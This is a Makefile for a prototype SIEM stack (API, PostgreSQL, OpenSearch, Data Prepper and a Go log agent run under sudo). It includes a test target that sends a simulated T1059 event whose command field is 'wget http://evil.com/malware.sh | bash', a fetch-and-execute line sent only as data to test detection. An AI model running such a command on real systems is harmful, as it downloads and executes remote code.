.PHONY: up down restart logs build-agent test-t1059

up: build-agent
	@echo "🧪 Cleaning up potential container conflicts..."
	@-docker rm -f siem_api 2>/dev/null || true
	@echo "🚀 Starting SIEM infrastructure (API, DB, OpenSearch, Data Prepper)..."
	./docker-compose-v2 up -d --build
	@echo "🛡️  Starting Go Agent in the background..."
	@echo "   (You may be prompted for your sudo password to allow reading /var/log/syslog)"
	@sudo -v
	@# Kill any existing agent process before starting a new one
	@-sudo pkill -f "./agent/agent" 2>/dev/null || true
	@sudo AGENT_SERVER_URL=http://localhost:8000 \
		AGENT_LOG_PATH=/var/log/syslog \
		AGENT_LOG_TYPE=syslog \
		nohup ./agent/agent > agent.log 2>&1 &
	@echo ""
	@echo "✅ SIEM Prototype is UP & RUNNING!"
	@echo "➡️  Dashboard:          http://localhost:8000/dashboard"
	@echo "➡️  OpenSearch:         http://localhost:9200"
	@echo "➡️  OpenSearch Dashboards (debug): http://localhost:5601"
	@echo "➡️  Data Prepper:       http://localhost:2021"
	@echo "➡️  Agent Logs:         tail -f agent.log"
	@echo "➡️  Services:           docker-compose logs -f"
	@echo ""
	@echo "🛑 To stop everything, run: make down"

build-agent:
	@echo "🔨 Building Go Agent..."
	@mkdir -p api/downloads
	@cd agent && GOOS=linux GOARCH=amd64 go build -o ../api/downloads/ovs-agent-linux-amd64 ./cmd/agent/main.go
	@echo "✅ Agent built and copied to api/downloads/ovs-agent-linux-amd64"

down:
	@echo "🛑 Stopping SIEM infrastructure..."
	@-docker rm -f siem_api 2>/dev/null || true
	./docker-compose-v2 down
	@echo "🛑 Stopping Go Agent process..."
	@-sudo pkill -f "./agent/agent" 2>/dev/null || true
	@echo "✅ Everything stopped."

restart: down up

logs:
	./docker-compose-v2 logs -f

# Send a test T1059 suspicious command event through the pipeline
test-t1059:
	@echo "🧪 Sending T1059 test payload (wget | bash)..."
	@curl -s -X POST http://localhost:8000/ingest/log \
		-H "Content-Type: application/json" \
		-d '{"agent_id": "test-agent", "hostname": "test-box", "log_type": "auditd", "cmdline": "wget http://evil.com/malware.sh | bash", "process_name": "bash", "username": "root"}' | python3 -m json.tool
	@echo "⏳ Waiting 15s for Data Prepper + poller to process..."
	@sleep 15
	@echo "🔍 Checking for T1059 alerts in PostgreSQL..."
	@./docker-compose-v2 exec -T db psql -U user -d siemdb -c "SELECT title, host, severity, description FROM alerts WHERE title LIKE '%T1059%' ORDER BY timestamp DESC LIMIT 3;"
